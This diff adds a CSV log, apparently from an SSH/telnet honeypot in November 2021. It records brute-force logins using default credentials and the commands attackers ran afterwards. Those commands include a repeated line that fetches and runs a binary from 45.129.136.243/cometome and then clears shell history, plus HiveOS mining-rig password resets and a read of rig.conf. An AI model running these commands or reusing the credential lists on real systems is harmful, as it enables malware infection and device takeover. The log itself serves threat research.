@@ -1,0 +1,301 @@
+timestamp,ip,url,commands,usernames,passwords,country,province,city,long,lat
+2021-11-23 11:47:05.408,136.144.41.3,,,,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:47:43.946,136.144.41.3,,,,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:47:44.104,136.144.41.3,,,,123,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:47:44.153,136.144.41.3,,b'sudo hive-passwd salutlume123f5123; sudo pkill Xorg; sudo pkill x11vnc',,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:48:22.861,136.144.41.3,,,,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:48:23.034,136.144.41.3,,,,1234,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:48:23.078,136.144.41.3,,b'sudo hive-passwd salutlume123f5123; sudo pkill Xorg; sudo pkill x11vnc',,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:49:00.567,136.144.41.3,,,,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:49:00.703,136.144.41.3,,,,123456,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:49:00.748,136.144.41.3,,b'sudo hive-passwd salutlume123f5123; sudo pkill Xorg; sudo pkill x11vnc',,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:49:37.608,136.144.41.3,,,,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:49:37.733,136.144.41.3,,,,12345678,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:49:37.783,136.144.41.3,,b'sudo hive-passwd salutlume123f5123; sudo pkill Xorg; sudo pkill x11vnc',,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:50:13.606,136.144.41.3,,,,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:50:13.725,136.144.41.3,,,,cloud,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:50:13.776,136.144.41.3,,b'sudo hive-passwd salutlume123f5123; sudo pkill Xorg; sudo pkill x11vnc',,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:50:49.007,136.144.41.3,,,,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:50:49.191,136.144.41.3,,,,amin123,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:50:49.259,136.144.41.3,,b'sudo hive-passwd salutlume123f5123; sudo pkill Xorg; sudo pkill x11vnc',,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:51:24.339,136.144.41.3,,,,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:51:24.476,136.144.41.3,,,,888888,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:51:24.553,136.144.41.3,,b'sudo hive-passwd salutlume123f5123; sudo pkill Xorg; sudo pkill x11vnc',,,United States,California,San Francisco,-122.4245,37.7809
+2021-11-23 11:55:27.305,164.90.206.79,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 12:00:39.067,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:00.698,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:00.999,193.29.14.205,,,root,root,Romania,,,24.997,45.9968
+2021-11-23 12:01:01.110,193.29.14.205,http://45.129.136.243/cometome,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:01.111,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:01.111,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:01:14.475,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:14.781,193.29.14.205,,,admin,admin,Romania,,,24.997,45.9968
+2021-11-23 12:01:14.894,193.29.14.205,http://45.129.136.243/cometome,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:14.895,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:14.895,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:01:28.366,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:28.657,193.29.14.205,,,root,password,Romania,,,24.997,45.9968
+2021-11-23 12:01:28.765,193.29.14.205,http://45.129.136.243/cometome,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:28.765,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:28.765,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:01:42.972,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:43.260,193.29.14.205,,,admin,1234,Romania,,,24.997,45.9968
+2021-11-23 12:01:43.367,193.29.14.205,http://45.129.136.243/cometome,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:43.367,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:43.367,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:01:57.950,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:58.240,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:58.348,193.29.14.205,http://45.129.136.243/cometome,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:58.348,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:01:58.348,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:02:13.630,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:02:13.927,193.29.14.205,,,,passwd,Romania,,,24.997,45.9968
+2021-11-23 12:02:14.037,193.29.14.205,http://45.129.136.243/cometome,,,,Romania,,,24.997,45.9968
+2021-11-23 12:02:14.037,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:02:14.037,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:02:29.331,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:02:29.623,193.29.14.205,,,,12345,Romania,,,24.997,45.9968
+2021-11-23 12:02:29.731,193.29.14.205,http://45.129.136.243/cometome,,admin,,Romania,,,24.997,45.9968
+2021-11-23 12:02:29.731,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:02:29.731,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:02:45.446,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:02:45.741,193.29.14.205,,,,raspberry,Romania,,,24.997,45.9968
+2021-11-23 12:02:45.850,193.29.14.205,http://45.129.136.243/cometome,,pi,,Romania,,,24.997,45.9968
+2021-11-23 12:02:45.850,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:02:45.850,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:03:01.638,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:03:01.937,193.29.14.205,,,,pi,Romania,,,24.997,45.9968
+2021-11-23 12:03:02.048,193.29.14.205,http://45.129.136.243/cometome,,raspberry,,Romania,,,24.997,45.9968
+2021-11-23 12:03:02.048,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:03:02.048,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:03:18.104,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:03:18.401,193.29.14.205,,,,ubnt,Romania,,,24.997,45.9968
+2021-11-23 12:03:18.510,193.29.14.205,http://45.129.136.243/cometome,,ubnt,,Romania,,,24.997,45.9968
+2021-11-23 12:03:18.510,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:03:18.510,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:03:34.688,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:03:34.985,193.29.14.205,,,,usuario,Romania,,,24.997,45.9968
+2021-11-23 12:03:35.096,193.29.14.205,http://45.129.136.243/cometome,,usuario,,Romania,,,24.997,45.9968
+2021-11-23 12:03:35.096,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:03:35.096,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:03:51.554,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:03:51.854,193.29.14.205,,,,support,Romania,,,24.997,45.9968
+2021-11-23 12:03:51.965,193.29.14.205,http://45.129.136.243/cometome,,support,,Romania,,,24.997,45.9968
+2021-11-23 12:03:51.966,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:03:51.966,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:04:08.392,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:04:08.695,193.29.14.205,,,,1234,Romania,,,24.997,45.9968
+2021-11-23 12:04:08.806,193.29.14.205,http://45.129.136.243/cometome,,1234,,Romania,,,24.997,45.9968
+2021-11-23 12:04:08.806,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:04:08.806,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:04:25.143,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:04:25.439,193.29.14.205,,,,passwd,Romania,,,24.997,45.9968
+2021-11-23 12:04:25.548,193.29.14.205,http://45.129.136.243/cometome,,root,,Romania,,,24.997,45.9968
+2021-11-23 12:04:25.548,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:04:25.548,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:04:41.872,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:04:42.168,193.29.14.205,,,,toor,Romania,,,24.997,45.9968
+2021-11-23 12:04:42.279,193.29.14.205,http://45.129.136.243/cometome,,root,,Romania,,,24.997,45.9968
+2021-11-23 12:04:42.279,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:04:42.279,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:04:58.510,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:04:58.801,193.29.14.205,,,,telnet,Romania,,,24.997,45.9968
+2021-11-23 12:04:58.908,193.29.14.205,http://45.129.136.243/cometome,,telnet,,Romania,,,24.997,45.9968
+2021-11-23 12:04:58.908,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:04:58.908,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:05:15.504,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:05:15.795,193.29.14.205,,,,administrator,Romania,,,24.997,45.9968
+2021-11-23 12:05:15.903,193.29.14.205,http://45.129.136.243/cometome,,root,,Romania,,,24.997,45.9968
+2021-11-23 12:05:15.903,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,Romania,,,24.997,45.9968
+2021-11-23 12:05:15.903,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Romania,,,24.997,45.9968
+2021-11-23 12:05:32.404,193.29.14.205,,,,,Romania,,,24.997,45.9968
+2021-11-23 12:05:32.696,193.29.14.205,,,,1234567890,Romania,,,24.997,45.9968
+2021-11-23 12:05:32.803,193.29.14.205,http://45.129.136.243/cometome,,root,,Romania,,,24.997,45.9968
+2021-11-23 12:05:32.803,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 12:05:32.803,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 12:05:49.848,193.29.14.205,,,,,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 12:05:50.142,193.29.14.205,,,,raspberry,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 12:05:50.251,193.29.14.205,http://45.129.136.243/cometome,,root,,United States,,,-97.822,37.751
+2021-11-23 12:05:50.251,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,United States,,,-97.822,37.751
+2021-11-23 12:05:50.251,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,United States,,,-97.822,37.751
+2021-11-23 12:06:06.923,193.29.14.205,,,,,United States,,,-97.822,37.751
+2021-11-23 12:06:07.217,193.29.14.205,,,,pass,United States,,,-97.822,37.751
+2021-11-23 12:06:07.326,193.29.14.205,http://45.129.136.243/cometome,,root,,United States,,,-97.822,37.751
+2021-11-23 12:06:07.326,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,United States,,,-97.822,37.751
+2021-11-23 12:06:07.326,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,United States,,,-97.822,37.751
+2021-11-23 12:06:24.304,193.29.14.205,,,,,United States,,,-97.822,37.751
+2021-11-23 12:06:24.585,193.29.14.205,,,,pass12345,United States,,,-97.822,37.751
+2021-11-23 12:06:24.689,193.29.14.205,http://45.129.136.243/cometome,,root,,United States,,,-97.822,37.751
+2021-11-23 12:06:24.689,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,United States,,,-97.822,37.751
+2021-11-23 12:06:24.689,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,United States,,,-97.822,37.751
+2021-11-23 12:06:41.410,193.29.14.205,,,,,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 12:06:41.709,193.29.14.205,,,,password,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 12:06:41.820,193.29.14.205,http://45.129.136.243/cometome,,admin,,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 12:06:41.820,New IP-based URL detected from 193.29.14.205,45.129.136.243/cometome;,,,,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 12:06:41.820,193.29.14.205,,b'cat /etc/issue/; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://45.129.136.243/cometome; cometome; chmod 777 cometome; ./cometome; history -c',,,Germany,Hesse,Frankfurt am Main,8.6843,50.1188
+2021-11-23 12:47:18.944,205.185.119.40,,,,,United States,,,-97.822,37.751
+2021-11-23 12:47:44.085,205.185.119.40,,,,,United States,,,-97.822,37.751
+2021-11-23 12:47:45.304,205.185.119.40,,,,1,United States,,,-97.822,37.751
+2021-11-23 12:47:45.797,205.185.119.40,,b'sudo hive-passwd `hostname`; echo `hostname`; pkill Xorg; pkill x11vnc; pkill Hello; systemctl stop shellinabox; history -c',,,United States,,,-97.822,37.751
+2021-11-23 13:08:30.330,23.183.81.227,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:09:13.061,23.183.81.227,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:09:15.086,23.183.81.227,,,,1,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:09:15.374,23.183.81.227,,b'sudo hive-passwd 123456cnur; sudo pkill Xorg; sudo pkill x11vnc',,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:10:27.945,23.183.81.227,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:10:30.616,23.183.81.227,,,,123456,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:10:30.918,23.183.81.227,,b'sudo hive-passwd 123456cnur; sudo pkill Xorg; sudo pkill x11vnc',,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:11:52.061,23.183.81.227,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:11:52.623,23.183.81.227,,,,dS5mdWNraW4udHJpZWQubmlnZ2E,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:11:52.813,23.183.81.227,,b'sudo hive-passwd 123456cnur; sudo pkill Xorg; sudo pkill x11vnc',,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:13:11.215,23.183.81.227,,,,,United States,Nevada,Las Vegas,-115.1447,36.102
+2021-11-23 13:13:13.359,23.183.81.227,,,,fwontop,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:13:13.766,23.183.81.227,,b'sudo hive-passwd 123456cnur; sudo pkill Xorg; sudo pkill x11vnc',,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:19:51.083,199.19.224.231,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:20:44.017,199.19.224.231,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:20:45.958,199.19.224.231,,,,1,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:20:46.438,199.19.224.231,,b'sudo hive-passwd dg801b23dg12dwqsdghaiodg120dgasodg1wo08_123Z; pkill Xorg; pkill x11vnc; pkill Hello; systemctl stop shellinabox; history -c; cat /hive-config/rig.conf',,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 13:31:23.623,128.1.42.94,,,,,United States,,,-97.822,37.751
+2021-11-23 13:32:41.791,23.183.81.54,,,,,Czechia,,,14.411,50.0853
+2021-11-23 13:33:46.103,23.183.81.54,,,,,Czechia,,,14.411,50.0853
+2021-11-23 13:33:48.868,23.183.81.54,,,,1,Czechia,,,14.411,50.0853
+2021-11-23 13:33:49.145,23.183.81.54,,b'sudo hive-passwd `hostname`; echo `hostname`; pkill Xorg; pkill x11vnc; pkill Hello; systemctl stop shellinabox; history -c',,,Czechia,,,14.411,50.0853
+2021-11-23 14:04:12.759,104.248.203.112,,,,,United States,,,-97.822,37.751
+2021-11-23 14:07:04.151,104.248.203.112,,,,,United States,,,-97.822,37.751
+2021-11-23 14:07:04.258,104.248.203.112,,,,huawei@123,United States,,,-97.822,37.751
+2021-11-23 14:07:04.292,104.248.203.112,,b'uname -s -v -n -r -m',root,,United States,,,-97.822,37.751
+2021-11-23 14:09:04.770,104.248.203.112,,,,,Netherlands,,,4.8995,52.3824
+2021-11-23 14:09:04.888,104.248.203.112,,,,Change_Me,Netherlands,,,4.8995,52.3824
+2021-11-23 14:09:04.926,104.248.203.112,,b'uname -s -v -n -r -m',root,,Netherlands,,,4.8995,52.3824
+2021-11-23 14:10:04.771,104.248.203.112,,,,,Netherlands,,,4.8995,52.3824
+2021-11-23 14:10:04.898,104.248.203.112,,,,11111111,United States,,,-97.822,37.751
+2021-11-23 14:10:04.938,104.248.203.112,,b'uname -s -v -n -r -m',root,,United States,,,-97.822,37.751
+2021-11-23 14:10:14.919,205.185.119.40,,,,,United States,,,-97.822,37.751
+2021-11-23 14:12:04.968,104.248.203.112,,,,,United States,,,-97.822,37.751
+2021-11-23 14:12:05.078,104.248.203.112,,,,123456,United States,,,-97.822,37.751
+2021-11-23 14:12:05.112,104.248.203.112,,b'uname -s -v -n -r -m',root,,United States,,,-97.822,37.751
+2021-11-23 14:13:04.965,104.248.203.112,,,,,United States,,,-97.822,37.751
+2021-11-23 14:13:05.083,104.248.203.112,,,,mos,United States,,,-97.822,37.751
+2021-11-23 14:13:05.119,104.248.203.112,,b'uname -s -v -n -r -m',mos,,United States,,,-97.822,37.751
+2021-11-23 14:32:57.553,65.49.20.69,,,,,United States,,,-97.822,37.751
+2021-11-23 14:43:18.839,195.133.18.24,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 14:43:50.911,195.133.18.24,,,,,Czechia,,,14.411,50.0853
+2021-11-23 14:43:51.088,195.133.18.24,,,,1,Czechia,,,14.411,50.0853
+2021-11-23 14:43:51.143,195.133.18.24,,b'sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64; sudo pkill Xorg; sudo pkill x11vnc',,,Czechia,,,14.411,50.0853
+2021-11-23 15:51:46.232,23.183.81.116,,,,,Czechia,,,14.411,50.0853
+2021-11-23 15:55:53.242,23.183.81.116,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 15:55:53.787,23.183.81.116,,,,mos,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 15:55:53.965,23.183.81.116,,b'uname -s -v -n -r -m',mos,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 15:57:13.142,45.144.225.69,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 15:57:40.767,45.144.225.69,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 15:57:41.761,45.144.225.69,,,,1,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 15:57:41.831,45.144.225.69,,b'sudo hive-passwd salutlume123; sudo pkill Xorg;',,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:00:05.343,23.183.81.116,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:00:05.904,23.183.81.116,,,,msos,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:00:06.426,23.183.81.116,,b'uname -s -v -n -r -m',minerstat,,Czechia,,,14.411,50.0853
+2021-11-23 16:03:42.157,23.183.81.116,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:03:42.671,23.183.81.116,,,,live,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:03:42.832,23.183.81.116,,b'uname -s -v -n -r -m',ethos,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:07:16.258,23.183.81.116,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:07:16.807,23.183.81.116,,,,mmpOS,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:07:16.976,23.183.81.116,,b'uname -s -v -n -r -m',miner,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:24:00.043,167.248.133.57,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:32:47.452,159.223.2.20,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:36:57.918,195.133.18.24,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:37:38.440,195.133.18.24,,,,,Ukraine,,,30.5287,50.4522
+2021-11-23 16:37:38.647,195.133.18.24,,,,1,Ukraine,,,30.5287,50.4522
+2021-11-23 16:37:38.721,195.133.18.24,,b'sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64; sudo pkill Xorg; sudo pkill x11vnc',,,Ukraine,,,30.5287,50.4522
+2021-11-23 16:39:54.075,159.223.2.20,,,,,Ukraine,,,30.5287,50.4522
+2021-11-23 16:39:54.332,159.223.2.20,,,,1,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:39:54.394,159.223.2.20,,b'nproc;uname -a',,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:40:56.959,159.223.2.20,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:40:57.126,159.223.2.20,,,,111111,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:40:57.166,159.223.2.20,,b'nproc;uname -a',,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:41:59.739,159.223.2.20,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:41:59.917,159.223.2.20,,,,000000,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:41:59.956,159.223.2.20,,b'nproc;uname -a',,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:42:09.938,195.133.18.210,,,,,Netherlands,North Holland,Amsterdam,4.9392,52.352
+2021-11-23 16:43:03.063,159.223.2.20,,,,,United States,,,-97.822,37.751
+2021-11-23 16:43:03.187,159.223.2.20,,,,0,United States,,,-97.822,37.751
+2021-11-23 16:43:03.225,159.223.2.20,,b'nproc;uname -a',,,United States,,,-97.822,37.751
+2021-11-23 16:44:06.254,159.223.2.20,,,,,United States,,,-97.822,37.751
+2021-11-23 16:44:06.384,159.223.2.20,,,,1234,Czechia,,,14.411,50.0853
+2021-11-23 16:44:06.420,159.223.2.20,,b'nproc;uname -a',,,Czechia,,,14.411,50.0853
+2021-11-23 16:45:08.487,159.223.2.20,,,,,Czechia,,,14.411,50.0853
+2021-11-23 16:45:08.600,159.223.2.20,,,,123,Czechia,,,14.411,50.0853
+2021-11-23 16:45:08.636,159.223.2.20,,b'nproc;uname -a',,,United States,California,San Francisco,-122.3838,37.7308
+2021-11-23 16:45:18.620,45.88.137.253,,,,,China,,,113.722,34.7732
+2021-11-23 16:45:18.622,45.88.137.253,,,,,China,,,113.722,34.7732
+2021-11-23 16:45:25.561,45.88.137.253,,,,,China,,,113.722,34.7732
+2021-11-23 16:45:25.563,45.88.137.253,,,,,China,,,113.722,34.7732
+2021-11-23 16:46:10.039,159.223.2.20,,,,,United States,Tennessee,Lenoir City,-84.2181,35.7866
+2021-11-23 16:46:10.180,159.223.2.20,,,,12,United States,Tennessee,Lenoir City,-84.2181,35.7866
+2021-11-23 16:46:10.218,159.223.2.20,,b'nproc;uname -a',,,United States,Tennessee,Lenoir City,-84.2181,35.7866
+2021-11-23 16:47:12.306,159.223.2.20,,,,,Ukraine,,,30.5287,50.4522
+2021-11-23 16:47:12.491,159.223.2.20,,,,12345,Ukraine,,,30.5287,50.4522
+2021-11-23 16:47:12.530,159.223.2.20,,b'nproc;uname -a',,,Ukraine,,,30.5287,50.4522
+2021-11-23 16:48:13.751,159.223.2.20,,,,,India,West Bengal,Kolkata,88.3832,22.518
+2021-11-23 16:48:13.927,159.223.2.20,,,,123456,Luxembourg,Luxembourg,Luxembourg,6.1294,49.6113
